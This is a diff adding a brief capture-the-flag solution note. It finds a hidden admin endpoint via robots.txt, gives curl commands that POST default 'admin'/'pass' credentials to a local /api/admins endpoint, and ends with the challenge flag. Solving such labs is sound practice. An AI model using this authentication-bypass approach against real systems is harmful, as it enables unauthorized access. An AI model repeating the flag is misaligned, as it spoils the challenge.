@@ -1,0 +1,11 @@
+get the /aadmin endpoint from /robots.txt (colour is changed to white)
+
+create a curl to enter username and pasword to /login 
+
+for cmd - curl.exe -X POST http://127.0.0.1:5000/api/admins -H "Content-Type: application/json" -d "{\"username\":\"admin\",\"password\":\"pass\"}"
+
+for other curl -X POST http://localhost:5000/api/admins \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"pass"}'
+
+ctf7{auth_bypass_007}
